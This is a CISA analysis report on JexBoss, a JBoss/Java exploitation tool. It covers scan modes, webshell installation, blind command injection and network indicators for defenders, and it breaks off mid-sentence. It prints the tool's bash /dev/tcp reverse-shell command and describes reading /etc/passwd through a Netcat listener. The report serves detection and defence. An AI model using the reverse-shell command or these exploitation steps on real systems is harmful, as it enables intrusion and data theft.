{"markdown": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n JexBoss \u2013 JBoss Verify and EXploitation Tool \\| CISA\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Skip to main content](#main) \n\n\n\n\n\n\n\n\n\n\n\n\n![U.S. flag](/profiles/cisad8_gov/themes/custom/gesso/dist/images/us_flag_small.png)\n\n\n\n An official website of the United States government\n \n\n\n\n Here\u2019s how you know\n \n\n\n\n\n\n Here\u2019s how you know\n \n\n\n\n\n\n\n![Dot gov](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-dot-gov.svg)\n\n\n**Official websites use .gov** \n  \n\n A\n **.gov** \n website belongs to an official government organization in the United States.\n \n\n\n\n\n\n![HTTPS](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-https.svg)\n\n\n**Secure .gov websites use HTTPS** \n  \n\n A\n **lock** \n (\n \n\n\n Lock\n \n\n A locked padlock\n \n\n\n\n\n ) or\n **https://** \n means you\u2019ve safely connected to the .gov website. Share sensitive information only on official, secure websites.\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools \"Free Cyber Services\") \n[\\#protect2024](/protect2024) \n[Secure Our World](/node/18883) \n[Shields Up](/node/8056) \n[Report A Cyber Issue](/node/16591) \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[![CISA Logo Americas Cyber Defense Agency](/sites/default/files/images/SVG/header_logo_tagline_update.svg)](/)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[![CISA Logo](/sites/default/files/images/SVG/mobile_logo_wordmark.svg)](/)\n\n\n\n\n\n\n\n\n\n\n Search\n \n\n\n\n\n\n\n\n\n\n Menu\n \n\n\n\n\n\n\n\n\n\n\n\n\n![America's Cyber Defense Agency](/sites/default/files/images/SVG/header_tagline_mobile_update.svg)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Close\n \n\n\n\n\n* Topics\n \n\n\n\n[Topics](/topics) \n\n\n\n\n[Cybersecurity Best Practices](/topics/cybersecurity-best-practices)\n\n\n\n\n[Cyber Threats and Advisories](/topics/cyber-threats-and-advisories)\n\n\n\n\n[Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience)\n\n\n\n\n[Election Security](/topics/election-security)\n\n\n\n\n[Emergency Communications](/topics/emergency-communications)\n\n\n\n\n[Industrial Control Systems](/topics/industrial-control-systems)\n\n\n\n\n[Information and Communications Technology Supply Chain Security](/topics/information-communications-technology-supply-chain-security)\n\n\n\n\n[Partnerships and Collaboration](/topics/partnerships-and-collaboration)\n\n\n\n\n[Physical Security](/topics/physical-security)\n\n\n\n\n[Risk Management](/topics/risk-management)\n\n\n\n\n\n[How can we help?](/audiences) \n\n\n[Government](/topics/government) \n[Educational Institutions](/topics/educational-institutions) \n[Industry](/topics/industry) \n[State, Local, Tribal, and Territorial](/topics/state-local-tribal-and-territorial) \n[Individuals and Families](/topics/individuals-and-families) \n[Small and Medium Businesses](/topics/small-and-medium-businesses) \n[Find Help Locally](/audiences/find-help-locally) \n[Faith\\-Based Community](/audiences/faith-based-community) \n[Executives](/audiences/executives) \n[High\\-Risk Communities](/audiences/high-risk-communities)\n* [Spotlight](/spotlight)\n* Resources \\& Tools\n \n\n\n\n[Resources \\& Tools](/resources-tools) \n\n\n\n\n[All Resources \\& Tools](/resources-tools/all-resources-tools)\n\n\n\n\n[Services](/resources-tools/services)\n\n\n\n\n[Programs](/resources-tools/programs)\n\n\n\n\n[Resources](/resources-tools/resources)\n\n\n\n\n[Training](/resources-tools/training)\n\n\n\n\n[Groups](/resources-tools/groups)\n* News \\& Events\n \n\n\n\n[News \\& Events](/news-events) \n\n\n\n\n[News](/news-events/news)\n\n\n\n\n[Events](/news-events/events)\n\n\n\n\n[Cybersecurity Alerts \\& Advisories](/news-events/cybersecurity-advisories)\n\n\n\n\n[Directives](/news-events/directives)\n\n\n\n\n[Request a CISA Speaker](/news-events/request-speaker)\n\n\n\n\n[Congressional Testimony](/news-events/congressional-testimony)\n\n\n\n\n[CISA Conferences](/cisa-conferences)\n\n\n\n\n[CISA Live!](/cisa-live)\n* Careers\n \n\n\n\n[Careers](/careers) \n\n\n\n\n[Benefits \\& Perks](/careers/benefits-perks)\n\n\n\n\n[HireVue Applicant Reasonable Accommodations Process](/careers/hirevue-applicant-reasonable-accommodations-process)\n\n\n\n\n[Hiring](/general-recruitment-and-hiring-faqs)\n\n\n\n\n[Resume \\& Application Tips](/careers/resume-application-tips)\n\n\n\n\n[Students \\& Recent Graduates](/students-recent-graduates-employment-opportunities)\n\n\n\n\n[Veteran and Military Spouses](/careers/veteran-and-military-spouse-employment-opportunities)\n\n\n\n\n[Work @ CISA](/careers/work-cisa)\n* About\n \n\n\n\n[About](/about) \n\n\n\n\n[Culture](/about/culture)\n\n\n\n\n[Divisions \\& Offices](/about/divisions-offices)\n\n\n\n\n[Regions](/about/regions)\n\n\n\n\n[Leadership](/about/leadership)\n\n\n\n\n[Doing Business with CISA](/doing-business-cisa)\n\n\n\n\n[Site Links](/site-links)\n\n\n\n\n[Reporting Employee and Contractor Misconduct](/reporting-employee-and-contractor-misconduct)\n\n\n\n\n[CISA GitHub](/cisa-github)\n\n\n\n\n[CISA Central](/cisa-central)\n\n\n\n\n[2023 Year In Review](/about/2023YIR)\n\n\n\n\n[Contact Us](/about/contact-us)\n\n\n\n\n\n\n\n\n\n[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools \"Free Cyber Services\") \n[\\#protect2024](/protect2024) \n[Secure Our World](/node/18883) \n[Shields Up](/node/8056) \n[Report A Cyber Issue](/node/16591) \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Breadcrumb\n \n1. [Home](/)\n2. [News \\& Events](/news-events)\n3. [Cybersecurity Advisories](/news-events/cybersecurity-advisories)\n4. [Analysis Report](/news-events/cybersecurity-advisories?f%5B0%5D=advisory_type%3A65)\n\n\n\n\n\n\n\n\n Share:\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Analysis Report\n \nJexBoss \u2013 JBoss Verify and EXploitation Tool\n============================================\n\n\n\n\n\n Last Revised\n \n\n\n November 08, 2018\n \n\n\n\n\n Alert Code\n \n\n AR18\\-312A\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n#### JexBoss\n\n\n\n JexBoss is a tool used to test and exploit vulnerabilities in Java applications and platforms, including the JBoss AS/WildFly web server framework. JexBoss is written in the Python programming language using standard Python libraries. JexBoss is run from the command\\-line interface (CLI) and operated using a console interface. JexBoss was released as an open\\-source tool on GitHub in November 2014\\. JexBoss\u2019 author regularly added new features and exploits until March 2017\\.\n \n\n\n\n Early versions of JexBoss specifically targeted JBoss AS versions 3\u20136\\. JexBoss has since evolved into a framework that can be used to test and exploit generic Java\\-related vulnerabilities over HyperText Transfer Protocol (HTTP).\n \n\n\n\n In addition to testing JBoss AS for weak default configurations, JexBoss includes exploits for a variety of known vulnerabilities in Java\\-based frameworks, including some versions of Java Server Faces, Java Seam Framework, Remote Method Invocation over HTTP, Jenkins CLI, Remote Java Management Extension (JMX), and Apache Struts.\n \n\n\n\n JexBoss also offers attackers the ability to target deserialization vulnerabilities in generic Java applications and servlets by allowing an attacker to specifically target Uniform Resource Locators (URLs) and\n `HTTP POST` \n parameters. This capability can help attackers customize their attacks against their target and exploit zero\\-day Java deserialization vulnerabilities.\n \n\n\n\n JexBoss\u2019 ultimate goal is to provide the attacker with a means of executing arbitrary operating system (OS) commands on the target host. This is achieved by using one of the following mechanisms:\n \n\n\n* **Installation of a webshell** \n \u2013 allows an attacker to submit OS commands to a particular HTTP URL and receive the output of the executed command in the HTTP response.\n* **Blind command injection** \n \u2013 allows an attacker to submit OS commands as part of a packaged exploit for a specific vulnerability. The command will be executed, but the attacker will not see the output.\n* **Establishment of a reverse shell** \n \u2013 both a webshell and a blind command injection can facilitate a third method of executing arbitrary OS commands: the establishment of a reverse shell. In the establishment of a reverse shell, the target initiates a Transmission Control Protocol (TCP) connection with the host and port of the attacker\u2019s choice, after which commands and command outputs are transferred over that new connection.\n\n\n#### JBoss AS/WildFly\n\n\n\n JBoss AS/WildFly is a Java\\-based web server framework that simplifies the process of installing, deploying, and maintaining servlets. JBoss AS was released in 2002 as JBoss AS version 3 and was under continued development until 2012, with the final release of JBoss AS 7\\.1\\.1\\. JBoss AS 7\\.1\\.1 was then rebranded under the community project WildFly, which remains under continued development and maintenance. Legacy versions of JBoss AS (particularly versions 6 and older) have unpatched security vulnerabilities because they are no longer maintained. In August 2018, NCCIC\u2019s search via the Shodan search engine showed at least 28,060 web servers running outdated and unsupported JBoss AS software.\n \n\n\n#### Reported Use of JexBoss\n\n\n\n In March 2016, the Cisco Talos Intelligence Group (Talos) investigated a widespread ransomware campaign known as SamSam, which was targeting the healthcare industry.\n [\\[1]](https://blog.talosintelligence.com/2016/03/samsam-ransomware.html) \n Talos identified numerous instances where the attackers used JexBoss to gain initial access to the target network through vulnerable versions of JBoss AS. The attackers then moved laterally to reach the intended ransomware targets. This campaign was the first widely reported use of JexBoss.\n \n\n\n\n The April 2017 Symantec Internet Security Threat Report documented an intrusion by the Iran\\-based Chafer espionage group against a target in Turkey. In that intrusion, Chafer used JexBoss to identify and exploit a vulnerable version of JBoss AS, then moved laterally into other computers on the victim\u2019s network.\n [\\[2]](https://www.symantec.com/content/dam/symantec/docs/reports/istr-22-2017-en.pdf) \n\n\n\n\n These two instances illustrate threat actors\u2019 use of JexBoss to gain initial access to vulnerable internet\\-facing versions of JBoss AS. The threat actors leveraged their initial access to move deeper into a victim\u2019s network. The success of these exploits highlight the victims\u2019 weak web server sustainment practices (i.e., failure to upgrade to a more secure version of JBoss AS/Wildfly).\n \n\n\n\n Although more commonly used by threat actors, cybersecurity hunt teams also use JexBoss to evaluate the security of Java web platforms. When a hunt team finds a vulnerable web server, they can leverage JexBoss to pivot into other systems on the target network, which provides a more comprehensive security evaluation.\n \n\n\n#### Executing JexBoss\n\n\n\n JexBoss can be run from most standard OSs. To show JexBoss\u2019 interface and analyze the tool\u2019s behavior, NCCIC ran JexBoss from an Ubuntu Linux system against a vulnerable version of JBoss AS 6\\.1\\.0 in a secured test environment.\n \n\n\n\n When run without any command\\-line options, JexBoss\u2019 default behavior is to display a banner followed by a list of command\\-line option examples that demonstrate different ways to run JexBoss. JexBoss then exits without performing any further actions.\n \n\n\n\n An attacker can supply command\\-line options to JexBoss to alter the tool\u2019s default behavior. A command\\-line option (hereafter known as an option) modifies the operation of a command. The command\u2019s program determines the effect of the option. Options follow the command name on the command line, separated by spaces. Some options require a value to specify variable parameters.\n \n\n\n##### JexBoss Modes\n\n\n\n An attacker can run JexBoss in one of three \u201cmodes:\u201d\n \n\n\n* **Standalone mode** \n \u2013 this is JexBoss\u2019 default mode, used to scan a single target;\n* **Auto\\-scan mode** \n \u2013 this mode is used to identify and scan all possible targets in a network; and\n* **File\\-scan mode** \n \u2013 this mode is used to scan targets specified in a file.\n\n\n\n Each scan involves the attacker\u2019s computer connecting to the target computer to probe for vulnerabilities that JexBoss has the ability to exploit. After a scan completes, JexBoss will not automatically attempt to exploit a target unless given additional options or instructions.\n \n\n\n###### Standalone Mode\n\n\n\n The \u2013mode standalone option instructs JexBoss to run in standalone mode, targeting a single host. Standalone mode is the default mode, so this option may be omitted from the command line.\n \n\n\n\n Standalone mode requires either the\n `\u2013host HOST` \n or the\n `\u2013u HOST` \n option, the value specifying the target to scan. (The\n `\u2013host HOST` \n and\n `\u2013u HOST` \n options behave identically.) The\n `HOST` \n value indicates the target\u2019s network protocol, host (Internet Protocol \\[IP] address or domain name), and port. In the example shown in figure 1, JexBoss will scan the target host at IP address 127\\[.]0\\[.]0\\[.]1 using HTTP and TCP port 8080\\.\n \n\n\n\n**Note:** \n for the remainder of this report, if two options behave identically, they will be shown with a slash (\u201c/\u201d) between them. For example, the\n `-host HOST` \n and\n `-u HOST` \n options will be shown as\n `-host/-u HOST` \n .\n \n\n\n\n[![]()](/sites/default/files/publications/figure1.png)\n\n\n\n\n**Figure 1: JexBoss screenshot \u2013 specify target on the command\\-line** \n\n\n\n\n**Note:** \n all JexBoss screenshots in this report show JexBoss in standalone mode.\n \n\n\n###### Auto\\-Scan Mode\n\n\n\n The\n `-mode auto-scan` \n option instructs JexBoss to use auto\\-scan mode to identify and scan multiple hosts in a network block. This mode makes use of additional options:\n \n\n\n* `-network NETWORK` \n ,\n* `-ports PORTS` \n , and\n* `-results LOGFILENAME` \n .\n\n\n\n`NETWORK` \n must be a block of IP addresses in Classless Internet Domain Routing notation. If this option is omitted, JexBoss will scan the /16 network block of the attacking computer\u2019s primary network interface.\n `PORTS` \n must be a comma\\-separated list of TCP ports. If this option is omitted, JexBoss will scan each IP address for TCP ports 80 and 8080, the standard HTTP ports.\n \n\n\n\n JexBoss will scan the target block of IP addresses by attempting to connect to each IP address within the network block on each target TCP port. The results of the scan are written to the\n `LOGFILENAME` \n file, or\n `jexboss_auto_scan_results.log` \n if the \\-\n `results` \n option is omitted.\n \n\n\n###### File\\-Scan Mode\n\n\n\n The\n `-mode file-scan` \n option instructs JexBoss to use file\\-scan mode to scan multiple hosts specified in a file. This mode makes use of two additional options:\n \n\n\n* `-file FILENAME` \n , and\n* `-out LOGFILENAME` \n .\n\n\n\n The\n `-file` \n option is required for file\\-scan mode. The contents of the\n `FILENAME` \n file must be a list of targets, one per line, in the same format as required by the\n `-host/-u HOST` \n option. JexBoss will attempt to scan each target specified in the\n `FILENAME` \n file. The results of the scan are written to the\n `LOGFILENAME` \n file, or to\n `jexboss_file_scan_results.log` \n if the\n `-out` \n option is omitted.\n \n\n\n##### JexBoss Vulnerability Scan\n\n\n\n JexBoss scans targets to test whether they are vulnerable to several known exploits (e.g., weak authentication, Java object deserialization flaws). JexBoss then displays a report with the test results, indicating whether the tested components are exposed, vulnerable, or secured (the indicator for a secured component is \u201cOK\u201d).\n \n\n\n\n  \n\n The results shown in figure 2 indicate that the JBoss admin\\-console is exposed (i.e., reachable by the attacker) and that the JBoss AS jmx\\-console and JMXInvokerServlet components are vulnerable to exploitation. The results identify the other applications and frameworks as safe from the JexBoss exploits.\n \n\n\n\n![]()\n\n\n\n\n**Figure 2: JexBoss screenshot \u2013 vulnerability test results** \n\n\n\n\n**Note:** \n in a properly managed JBoss AS deployment, the admin\\-console should not be reachable from the internet; it should only be reachable from trusted internal hosts. However, even if an admin\\-console is only reachable from trusted internal hosts, dedicated attackers may be able to gain access to those internal hosts and attack the JBoss AS deployment from there.\n \n\n\n##### JexBoss Exploitation\n\n\n\n After scanning, JexBoss may perform exploitation of identified vulnerabilities depending upon the mode and options chosen.\n \n\n\n\n When run in standalone mode, JexBoss will display the results of the scan as shown in figure 2 by default. JexBoss will then enter an interactive mode that asks the attacker for input. As shown in figure 3, JexBoss will ask the attacker whether it should try to run an automated exploitation of a specific vulnerability.\n \n\n\n\n![]()\n\n\n\n\n**Figure 3: JexBoss screenshot \u2013 JexBoss asks permission to continue** \n\n\n\n\n If the attacker answers\n `yes` \n , JexBoss will attempt to exploit the vulnerability in admin\\-console.\n \n\n\n\n Figure 4 illustrates JexBoss targeting the admin\\-console component to determine if the JBoss AS platform is configured with the default administrator username and password\u2014which would be the case for an improperly managed JBoss AS deployment. In the exploit attempt shown in figure 4, JexBoss is attempting to log in to JBoss AS with default credentials. Alternatively, the attacker can specify the credentials JexBoss should attempt to use for the login, by using the\n `-J/--jboss-login` \n options.\n \n\n\n\n![]()\n\n\n\n\n**Figure 4: JexBoss screenshot \u2013 interactive exploitation of the admin\\-console** \n\n\n\n\n Figure 4 indicates success for several phases of the exploit attempt. These phases are listed below.\n \n\n\n* **Delivery:** \n JexBoss attempted login with default credentials; this attempt was sent to the JBoss AS admin\\-console.\n\t+ The success of this attempt is indicated by the phrase: \u201cTrying to perform authentication with default credentials\u201d.\n* **Exploitation:** \n JexBoss successfully logged in with default credentials.\n\t+ The success of this attempt is indicated by the phrase: \u201cSuccessfully logged in!\u201d\n* **Installation:** \n JexBoss successfully deployed the webshell code.\n\t+ The success of this attempt is indicated by the phrase: \u201cSuccessfully deployed code!\u201d\n* **Command and Control (C2\\):** \n JexBoss successfully executed OS commands.\n\t+ The success of this attempt is indicated by the output of the\n\t `uname -a` \n\t command, which starts with \u201cLinux 2f8c3354a075 4\\.13\\.0\\-38\u201d.\n* **Action on Objectives:** \n JexBoss successfully attempted this phase, as evident by the presence of the Shell\\> prompt.\n\t+ The success of this attempt is indicated by the presence of the\n\t `Shell>` \n\t prompt. The attacker can use the interactive\n\t `Shell>` \n\t prompt to access the JexBoss webshell to execute OS commands and see the command output.\n\n\n###### Automated Exploitation\n\n\n\n The auto\\-scan and file\\-scan modes of JexBoss will, by default, only perform the vulnerability scan and report the results. To exploit vulnerabilities when using these modes, the attacker must specify the\n `-A/--auto-exploit` \n option. The\n `-A/--auto-exploit` \n option can also be used in standalone mode, which will remove the yes or no questions asking whether to run automated exploitation, as well as the access to the webshell via the\n `Shell>` \n prompt.\n \n\n\n###### Webshell Installation\n\n\n\n JexBoss can use a number of different exploits to attempt to install the JexBoss webshell (e.g., exploitation of the JMX console). Once installed, the webshell grants the attacker the ability to execute OS commands remotely by accessing the webshell URL over HTTP or HTTP Secure (HTTPS). The webshell also enables the attacker to receive the command output in response. See the Webshell Analysis section for a description of the JexBoss webshell\u2019s capabilities.\n \n\n\n\n  \n\n JexBoss will attempt to exploit the vulnerable component to upload the webshell code over the HTTP session and install the webshell into the web server. If this is not successful\u2014and depending upon the vulnerability\u2014JexBoss may attempt to exploit the vulnerability to induce the web server to download and install the webshell from the internet.\n   \n\n When used in standalone mode, JexBoss allows the attacker to use the webshell through the interactive\n `Shell>` \n prompt by default, as shown in figure 4\\.\n \n\n\n###### Blind Command Injection\n\n\n\n In cases where the installation of the webshell fails or is not possible, such as with application Java deserialization vulnerabilities, JexBoss will attempt to perform a blind command injection. A blind command injection sends a payload\u2014created by the attacker, and which includes an OS command\u2014to the vulnerable component. The vulnerable component processes the payload insecurely and executes the embedded OS command. After the embedded OS command is executed, the output of this execution is not returned to the attacker; therefore, the command injection occurs \u201cblindly.\u201d The attacker can only determine whether the command was executed successfully by observing the effects of the command execution.\n \n\n\n\n JexBoss automates the creation and delivery of the payload. When attempting a blind command injection, the default OS command JexBoss packages in the payload is a Linux\\-specific command to create a reverse shell (see the Reverse Shell section).\n \n\n\n\n Alternatively, the attacker can specify a different OS command to be executed using the\n `--cmd CMD` \n option. As shown in figure 5, the\n `CMD` \n value is the alternate OS command.\n \n\n\n\n**Note:** \n using the\n `--cmd` \n option in the auto\\-scan and file\\-scan modes requires using the\n `-A/--auto-exploit` \n option, otherwise the\n `--cmd` \n option will be ignored.\n \n\n\n\n![]()\n\n\n\n\n**Figure 5: Specifying injected OS command with the\n `--cmd` \n option** \n\n\n\n\n In addition to the exploits against the vulnerable Java\\-based applications and frameworks shown in figure 2, JexBoss also supports the exploitation of arbitrary Java deserialization vulnerabilities with blind command injection attacks. To accomplish this, the attacker supplies a URL with the\n `-host/-u` \n option, an application parameter into which the payload will be injected with the\n `-H/--post-parameter PARAMETER` \n option, and the\n `-j/--app-unserialize` \n option.\n \n\n\n###### Reverse Shell\n\n\n\n A reverse shell is a common technique attackers use to execute commands interactively\u2014with keyboard input and text output\u2014through the target system\u2019s built\\-in command\\-line programs. JexBoss relays the input and output of the command\\-line program\u2014usually through the Bash command language interpreter on Linux targets and cmd.exe on Windows targets\u2014through a TCP connection initiated by the target to an IP address and a port of the attacker\u2019s choosing.\n \n\n\n\n The JexBoss webshell includes the capability to establish a reverse shell. If the attacker issues the\n `jexremote=IP:PORT` \n command to the webshell, the webshell will initiate a connection to the specified IP address and TCP port using Java\u2019s Socket class and relay OS commands to and output from the command\\-line program through that connection. An example of the\n `jexremote` \n command is shown in figure 4\\.\n \n\n\n\n Establishing a reverse shell can also be performed using blind command injection. The default OS command JexBoss packages in the exploit payload to create a reverse shell is\n \n\n\n\n`/bin/bash \u2013i > /dev/tcp/IP/PORT 0&>1 2>&1` \n\n\n\n\n (where\n `IP` \n and\n `PORT` \n are specified by the attacker). This command redirects the standard input and output of the Bash shell through the victim Linux kernel\u2019s built\\-in TCP device. For blind command injection, JexBoss obtains the\n `IP` \n and\n `PORT` \n values either from the values supplied in the\n `-r/--reverse-host RHOST:RPORT` \n option, or by prompting the attacker for those values, as shown in figure 6\\.\n \n\n\n\n![]()\n\n\n\n\n**Figure 6: JexBoss screenshot \u2013 JexBoss obtaining the\n `IP` \n and\n `PORT` \n for the reverse shell** \n\n\n\n\n To establish the TCP connection for the reverse shell, the computer with the IP address specified by the attacker must listen for connections on the specified TCP port. The program that listens for these connections must be able to accept user command\\-line input and display text output.\n \n\n\n\n A common tool used to listen for reverse shell connections is Netcat. Figure 7 shows Netcat being used to listen for incoming connections on TCP port 4444\\. After the reverse shell is established, Netcat shows the shell prompt. The attacker then uses the reverse shell to display the\n `/etc/passwd` \n file to get a listing of user accounts on the target.\n \n\n\n\n![]()\n\n\n\n\n**Figure 7: JexBoss screenshot \\- reverse shell using a Netcat listener** \n\n\n\n\n Attackers often use tools that are more sophisticated than Netcat, such as Meterpreter, to listen for reverse shell connections and control the reverse shell.\n \n\n\n#### Observable Network Behavior\n\n\n\n Security analysts can observe JexBoss\u2019 behavior through passive network traffic monitoring. The observable content depends upon the location of the organization\u2019s network traffic monitoring sensor. Communication between the attacker and the target can be observed at any in\\-line point\u2014on either the attacker\u2019s local network or the target\u2019s local network. Figure 8 shows an organization\u2019s typical network sensor architecture, including a passive sensor monitoring the packets traversing the organization\u2019s primary ingress and egress points.\n \n\n\n\n![]()\n\n\n\n\n**Figure 8: Typical organization's network sensor location** \n\n\n\n##### Version Checks\n\n\n\n Upon its initial execution in any of the scan modes, JexBoss will attempt to retrieve its version information from the internet by reaching out to the following URL:\n \n\n\n\n`hxxp[:]//joaomatosf.com/rnp/releases.txt` \n\n\n\n\n**Note:** \n all URLs have been modified to prevent unintentional access.\n \n\n\n\n If the version of JexBoss being used is not the latest version, the attacker will see a message recommending an upgrade.\n \n\n\n\n Some versions of the JexBoss webshell include a version check function, which can determine if the webshell being used is the latest version. The target computer will retrieve the latest available webshell version number from the following URL:\n \n\n\n\n`hxxp[:]//webshell.jexboss.net/jsp_version.txt` \n .\n \n\n\n\n If the installed webshell is not the latest available version, the attacker will see an HTTP response that includes a message recommending the webshell be upgraded, once the attacker accesses the webshell.\n \n\n\n\n**Note:** \n both of the JexBoss version checks detailed above will be evident to an affected organization. The organization will be able to see a lookup of the\n `joaomatosf.com` \n or\n `webshell.jexboss.net` \n domains in their Domain Name System (DNS) queries. These URLs will also be present in the organization\u2019s HTTP traffic. When these artifacts are found on an organization\u2019s network, they indicate JexBoss is present, which is a potential security risk and should be investigated.\n \n\n\n\n The attacker using JexBoss can disable both version checks by using the\n `-D/--disable-check-updates` \n option.\n \n\n\n##### Webshell Download\n\n\n\n If the installation of the JexBoss webshell fails, JexBoss may attempt to induce the target server to download and install the JexBoss webshell from the internet at the following URL:\n \n\n\n\n`hxxp[:]//www.joaomatosf.com/rnp/jexws4.war` \n\n\n\n\n If the\n `hxxp[:]//www.joaomatosf.com/rnp/jexws4.war` \n domain or URL is present in an organization\u2019s DNS and HTTP logs, this indicates the JexBoss webshell may be present on the organization\u2019s network. Any organization that identifies this activity should investigate it.\n \n\n\n\n Note: the filename of the webshell downloaded may change. The public webshell files on\n `hxxp[:]//www.joaomatosf.com` \n reveal multiple\n `jexws*.war` \n files, all of which have basically the same content, but with different MD5 checksums. Using different MD5 checksums allows older versions of JexBoss to induce the web server to download the latest version of the webshell.\n \n\n\n##### Attack Communication Parameters\n\n\n\n Communications between the attacker and target occur over HTTP or HTTPS, depending upon the target\u2019s web server configuration. HTTPS communications\u2014typically over TCP port 443 or 8443\u2014are encrypted. Organizations that use reverse proxies or some configurations of web application firewalls may be able to observe decrypted network traffic between the perimeter device and the web server. Otherwise, the signs of an attack over HTTPS will only be observable in network appliance logs or on the web server itself.\n \n\n\n\n**Note:** \n for the remainder of this report, unless otherwise noted, network traffic is assumed to be unencrypted HTTP, typically over port 80 or 8080\\.\n \n\n\n\n When JexBoss starts, it randomly selects one User\\-Agent header value from the list in table 1 to use for all HTTP requests to the target web server. The User\\-Agent values listed in table 1 are legitimate, helping JexBoss traffic blend in with legitimate HTTP traffic. However, they are also dated, which may help organizations differentiate them from normal HTTP traffic.\n \n\n\n\n\n\n\n**Table 1: JexBoss User\\-Agent header value choices** \n\n\n\n\n| **HTTP User\\-Agent Header Value Choices** |\n| --- |\n| Mozilla/5\\.0 (Macintosh; Intel Mac OS X 10\\.10; rv:38\\.0\\) Gecko/20100101 Firefox/38\\.0 |\n| Mozilla/5\\.0 (Windows NT 6\\.1; WOW64; rv:38\\.0\\) Gecko/20100101 Firefox/38\\.0 |\n| Mozilla/5\\.0 (Windows NT 6\\.1\\) AppleWebKit/537\\.36 (KHTML, like Gecko) Chrome/49\\.0\\.2623\\.112 Safari/537\\.36 |\n| Mozilla/5\\.0 (Macintosh; Intel Mac OS X 10\\_11\\_2\\) AppleWebKit/601\\.3\\.9 (KHTML, like Gecko) Version/9\\.0\\.2 Safari/601\\.3\\.9 |\n| Mozilla/5\\.0 (Windows NT 5\\.1\\) AppleWebKit/537\\.36 (KHTML, like Gecko) Chrome/44\\.0\\.2403\\.155 Safari/537\\.36 |\n| Mozilla/5\\.0 (Windows NT 5\\.1; rv:40\\.0\\) Gecko/20100101 Firefox/40\\.0 |\n| Mozilla/4\\.0 (compatible; MSIE 7\\.0; Windows NT 5\\.1; Trident/4\\.0; .NET CLR 2\\.0\\.50727; .NET CLR 3\\.0\\.4506\\.2152; .NET CLR 3\\.5\\.30729\\) |\n| Mozilla/5\\.0 (compatible; MSIE 6\\.0; Windows NT 5\\.1\\) |\n| Mozilla/4\\.0 (compatible; MSIE 6\\.0; Windows NT 5\\.1; SV1; .NET CLR 2\\.0\\.50727\\) |\n| Mozilla/5\\.0 (Windows NT 6\\.1; WOW64; rv:31\\.0\\) Gecko/20100101 Firefox/31\\.0 |\n| Mozilla/5\\.0 (Windows NT 5\\.1\\) AppleWebKit/537\\.36 (KHTML, like Gecko) Chrome/46\\.0\\.2490\\.86 Safari/537\\.36 |\n| Opera/9\\.80 (Windows NT 6\\.2; Win64; x64\\) Presto/2\\.12\\.388 Version/12\\.17 |\n| Mozilla/5\\.0 (Windows NT 6\\.1; WOW64; rv:45\\.0\\) Gecko/20100101 Firefox/45\\.0 |\n| Mozilla/5\\.0 (Windows NT 6\\.1; WOW64; rv:41\\.0\\) Gecko/20100101 Firefox/41\\.0 |\n\n\n\n Because JexBoss is written in Python, it is easy for sophisticated attackers to alter some of the static data sent to the target web server\u2014including the User\\-Agent header value choices and parts of the exploits themselves\u2014which would make signature\\-based detection ineffective.\n \n\n\n##### Attack Phases\n\n\n\n NCCIC has assessed that JexBoss operates at all seven steps in the Cyber Kill Chain framework. Due to the nature of the vulnerabilities and how they are exploited, JexBoss combines some of the steps, resulting in three high\\-level phases:\n \n\n\n* Phase 1: Reconnaissance;\n* Phase 2: Weaponization, Delivery, Exploitation, and Installation; and\n* Phase 3: C2 and Action on Objectives.\n\n\n###### Phase 1: Reconnaissance\n\n\n\n In Phase 1, JexBoss determines which componentsof the target web server, if any, are exposed and vulnerable. JexBoss connects to the target web server multiple times and makes multiple HTTP requests\u2014using the\n `GET` \n and\n `HEAD` \n methods\u2014to gather this information (see figure 9\\).\n \n\n\n\n![]()\n\n\n\n\n**Figure 9 : Typical Uniform Resource Identifier (URI) probe** \n\n\n\n\n Aside from the references to JexBoss in some URLs, most of these requests look legitimate or benign, with one notable exception, shown in figure 10\\.\n \n\n\n\n![]()\n\n\n\n\n**Figure 10: JexBoss\\-specific Apache Struts 2 probe** \n\n\n\n\n The HTTP request shown in figure 10 almost exactly matches the exploit of the Apache Struts 2 vulnerability (CVE\\-2017\\-5638\\) published by Vex Woo in March 2017\\.\n [\\[3]](https://www.exploit-db.com/exploits/41570/) \n However, JexBoss customizes two parts of this snippet by using\n `#gift` \n and\n `#giftarray` \n \u2014instead of\n `#cmd` \n and\n `#cmds` \n \u2014and by using\n `jexboss` \n as the command, which uniquely identifies the activity as being related to JexBoss.\n \n\n\n\n**Note:** \n the HTTP request shown in figure 10 attempts to exploit the Apache Struts 2 vulnerability; however, there is no command execution in this phase\u2014JexBoss is only trying to determine if an exploit is possible.\n \n\n\n\n Network defenders can deploy intrusion detection system (IDS) signatures\u2014such as those found in the Network IDS and IPS Signatures section\u2014to detect JexBoss\u2019 initial reconnaissance activity. However, some of these signatures will fire on attempted exploits, not just successful exploits, which limits their value to the defender.\n \n\n\n###### Phase 2: Weaponization, Delivery, Exploitation, and Installation\n\n\n\n JexBoss weaponizes exploits in different ways, depending upon the vulnerability being exploited. For example, to exploit the Apache Struts 2 vulnerability (CVE\\-2017\\-5638\\), JexBoss packages the exploit and the OS command to run in the Content\\-Type HTTP header value that will be delivered to the target web server in a\n `HTTP GET` \n request (see figure 10\\).\n \n\n\n\n JexBoss delivers exploits to the target web server over HTTP using\n `GET` \n or\n `POST` \n requests for URIs and data specific to the vulnerabilities.\n \n\n\n\n The exploits JexBoss uses are vulnerability\\-specific. For example, the attack against the admin\\-console exploits weak configurations of JBoss AS by simply attempting to log in with a username and password. Other attacks attempt to exploit Java deserialization vulnerabilities to install the JexBoss webshell or to execute OS commands.\n \n\n\n\n Figure 11 shows an example of the weaponization of the JexBoss webshell 